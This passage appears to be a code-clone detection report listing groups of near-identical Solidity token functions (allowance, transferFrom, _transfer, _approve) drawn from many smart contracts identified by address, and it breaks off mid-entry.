<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="75" endline="77" pcid="3886">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="75" endline="77" pcid="6750">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="79" endline="81" pcid="1246">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="79" endline="81" pcid="4708">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="75" endline="77" pcid="6121">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="79" endline="81" pcid="821">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="77" endline="79" pcid="2944">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="79" endline="81" pcid="5562">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="79" endline="81" pcid="7668">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="74" endline="76" pcid="5335">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="77" endline="79" pcid="8276">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="81" endline="83" pcid="5064">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="79" endline="81" pcid="4662">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="75" endline="77" pcid="5390">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="75" endline="77" pcid="1966">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="79" endline="81" pcid="4647">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="79" endline="81" pcid="2978">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="78" endline="80" pcid="3255">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="76" endline="78" pcid="5832">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="75" endline="77" pcid="7653">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1E7614EcC9bEeA7B9eE389C71A4D0b3CDc54cd21.sol" startline="43" endline="45" pcid="952">
    function getAllowance(address owner, address spender) external view returns (uint256) {
        return allowance[owner][spender];
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="78" endline="80" pcid="2290">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc3577998420272f181f6eb96b319aa31894fd373.sol" startline="35" endline="37" pcid="6996">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="420" endline="422" pcid="5812">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="75" endline="77" pcid="5500">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="81" endline="83" pcid="83">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="79" endline="81" pcid="1886">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="343" endline="345" pcid="8112">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="76" endline="78" pcid="8898">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="77" endline="79" pcid="1931">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="79" endline="81" pcid="6897">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="79" endline="81" pcid="5148">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="75" endline="77" pcid="3502">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="81" endline="83" pcid="3120">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="79" endline="81" pcid="4404">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="79" endline="81" pcid="4434">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="75" endline="77" pcid="6583">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="76" endline="78" pcid="3135">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="76" endline="78" pcid="666">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="80" endline="82" pcid="6719">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="76" endline="78" pcid="7267">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="76" endline="78" pcid="1133">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="80" endline="82" pcid="4349">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="76" endline="78" pcid="3473">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="75" endline="77" pcid="8366">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="74" endline="76" pcid="4033">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
</class>

<class classid="4" nclones="31" nlines="5" similarity="75">
<source file="systems/source-code/0x0000Db4632C8Ca4DD7E3C570397012cCBf57045b.sol" startline="46" endline="50" pcid="6">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0bdce6ba4c10f8e509b02382066e5402b97a7c80.sol" startline="1523" endline="1527" pcid="319">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, z[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="284" endline="288" pcid="1982">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
</source>
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="447" endline="451" pcid="32">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="48" endline="52" pcid="607">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, z[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="83" endline="87" pcid="911">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
</source>
<source file="systems/source-code/0x07d02e6806fe51ba3488ba0536589cdbd393ff15.sol" startline="1517" endline="1521" pcid="202">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, z[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="447" endline="451" pcid="9106">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0xf84335126a90025bd4eb3dd43a1aa6a906d6739b.sol" startline="42" endline="46" pcid="9033">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, z[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5fae3af584495c5c2cbaa83740e55037a6633368.sol" startline="40" endline="44" pcid="3632">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, a[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="452" endline="456" pcid="3698">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="450" endline="454" pcid="8515">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="371" endline="375" pcid="8114">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="65" endline="69" pcid="4123">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,msg.sender,_allowances[sender][msg.sender]-amount);
        return true;
    }
</source>
<source file="systems/source-code/0x70cf354cea658dc809b6f860d73d5a29088c19a6.sol" startline="45" endline="49" pcid="4145">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, z[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="448" endline="452" pcid="7913">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="284" endline="288" pcid="7878">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
</source>
<source file="systems/source-code/0x261771ae5888e4cc4f84eb74d9b2c931523272e9.sol" startline="598" endline="602" pcid="1210">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, z[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="484" endline="488" pcid="7774">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="481" endline="485" pcid="7023">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0xc3577998420272f181f6eb96b319aa31894fd373.sol" startline="39" endline="43" pcid="6997">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb6a9c0b053c8837e2616fc5aaff1886d03fd7065.sol" startline="39" endline="43" pcid="6655">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, a[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="448" endline="452" pcid="6410">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="448" endline="452" pcid="5814">
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="198" endline="206" pcid="5234">
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        _transfer(from, to, value);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(value));
        return true;
    }
</source>
<source file="systems/source-code/0x9338e0a6861e995db04cea5b63e1b94faba2291c.sol" startline="44" endline="48" pcid="5345">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, a[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="48" endline="52" pcid="1538">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, z[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="176" endline="180" pcid="4192">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        _transfer(_from, _to, _value);
        _approve(_from, msg.sender, allowance[_from][msg.sender].sub(_value));
        return true;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="190" endline="194" pcid="2324">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        _transfer(_from, _to, _value);
        _approve(_from, msg.sender, allowance[_from][msg.sender].sub(_value));
        return true;
    }
</source>
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="183" endline="187" pcid="1330">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        _transfer(_from, _to, _value);
        _approve(_from, msg.sender, allowance[_from][msg.sender].sub(_value));
        return true;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="185" endline="189" pcid="2492">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        _transfer(_from, _to, _value);
        _approve(_from, msg.sender, allowance[_from][msg.sender].sub(_value));
        return true;
    }
</source>
</class>

<class classid="5" nclones="22" nlines="5" similarity="75">
<source file="systems/source-code/0x0000Db4632C8Ca4DD7E3C570397012cCBf57045b.sol" startline="52" endline="56" pcid="7">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x42e8ECeca237eA7FA8b4B52F14Ca6C3d3c3213dc.sol" startline="55" endline="59" pcid="2477">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x2dae79a98c60696b65d591700dfeb9422ab2735c.sol" startline="64" endline="68" pcid="1355">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x2d11e3f0a7a3793f2211940d85cd3b48718c5e7a.sol" startline="62" endline="66" pcid="1348">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xfd0d43a6f56f17d6efe203410a9306a7953885e5.sol" startline="62" endline="66" pcid="9220">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xf84335126a90025bd4eb3dd43a1aa6a906d6739b.sol" startline="48" endline="52" pcid="9034">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        t[sender] -= amount;
        t[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x5fae3af584495c5c2cbaa83740e55037a6633368.sol" startline="46" endline="50" pcid="3633">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        b[sender] -= amount;
        b[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x44b5f46a20c2981d1bae28c3549365b9c6186931.sol" startline="58" endline="62" pcid="2553">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xf157af38701777fc54f34bf6ccde57bb1c364fae.sol" startline="62" endline="66" pcid="8825">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="54" endline="58" pcid="1539">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        y[sender] -= amount;
        y[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x70cf354cea658dc809b6f860d73d5a29088c19a6.sol" startline="51" endline="55" pcid="4146">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        t[sender] -= amount;
        t[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x7b43aee5ca91412d54b6ee6b35a1708063e210f1.sol" startline="62" endline="66" pcid="4621">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xc3577998420272f181f6eb96b319aa31894fd373.sol" startline="45" endline="49" pcid="6998">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xad412ae15b025e6a5a583c66a42d25e10d53cda6.sol" startline="59" endline="63" pcid="6292">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x9338e0a6861e995db04cea5b63e1b94faba2291c.sol" startline="50" endline="54" pcid="5346">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        b[sender] -= amount;
        b[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xb6a9c0b053c8837e2616fc5aaff1886d03fd7065.sol" startline="45" endline="48" pcid="6656">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        b[sender] -= amount;
        b[recipient] += amount;
    }
</source>
<source file="systems/source-code/0x25247a283047f964638be79886b61af12d3fe568.sol" startline="65" endline="69" pcid="1174">
    function _transfer(address sender, address recipient, uint256 amount) private {
        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x261771ae5888e4cc4f84eb74d9b2c931523272e9.sol" startline="604" endline="608" pcid="1211">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        t[sender] -= amount;
        t[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x07d02e6806fe51ba3488ba0536589cdbd393ff15.sol" startline="1523" endline="1527" pcid="203">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        t[sender] -= amount;
        t[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x3c6835AA49883DB868AfE31c682De7B3ACA4D32C.sol" startline="53" endline="58" pcid="2127">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x0bdce6ba4c10f8e509b02382066e5402b97a7c80.sol" startline="1529" endline="1533" pcid="320">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        t[sender] -= amount;
        t[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="54" endline="58" pcid="608">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        y[sender] -= amount;
        y[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
</class>

<class classid="6" nclones="20" nlines="4" similarity="100">
<source file="systems/source-code/0x0000Db4632C8Ca4DD7E3C570397012cCBf57045b.sol" startline="58" endline="61" pcid="8">
    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf84335126a90025bd4eb3dd43a1aa6a906d6739b.sol" startline="54" endline="57" pcid="9035">
    function _approve(address owner, address spender, uint256 amount) internal {
        z[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7b43aee5ca91412d54b6ee6b35a1708063e210f1.sol" startline="68" endline="71" pcid="4622">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x70cf354cea658dc809b6f860d73d5a29088c19a6.sol" startline="57" endline="60" pcid="4147">
    function _approve(address owner, address spender, uint256 amount) internal {
        z[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf157af38701777fc54f34bf6ccde57bb1c364fae.sol" startline="68" endline="71" pcid="8826">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9338e0a6861e995db04cea5b63e1b94faba2291c.sol" startline="56" endline="59" pcid="5347">
    function _approve(address owner, address spender, uint256 amount) internal {
        a[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x07d02e6806fe51ba3488ba0536589cdbd393ff15.sol" startline="1529" endline="1532" pcid="204">
    function _approve(address owner, address spender, uint256 amount) internal {
        z[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="60" endline="63" pcid="609">
    function _approve(address owner, address spender, uint256 amount) internal {
        z[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5fae3af584495c5c2cbaa83740e55037a6633368.sol" startline="52" endline="55" pcid="3634">
    function _approve(address owner, address spender, uint256 amount) internal {
        a[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0bdce6ba4c10f8e509b02382066e5402b97a7c80.sol" startline="1539" endline="1542" pcid="322">
    function _approve(address owner, address spender, uint256 amount) internal {
        z[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2d11e3f0a7a3793f2211940d85cd3b48718c5e7a.sol" startline="68" endline="71" pcid="1349">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="60" endline="63" pcid="1540">
    function _approve(address owner, address spender, uint256 amount) internal {
        z[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x25247a283047f964638be79886b61af12d3fe568.sol" startline="71" endline="74" pcid="1175">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfd0d43a6f56f17d6efe203410a9306a7953885e5.sol" startline="68" endline="71" pcid="9221">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xad412ae15b025e6a5a583c66a42d25e10d53cda6.sol" startline="65" endline="68" pcid="6293">
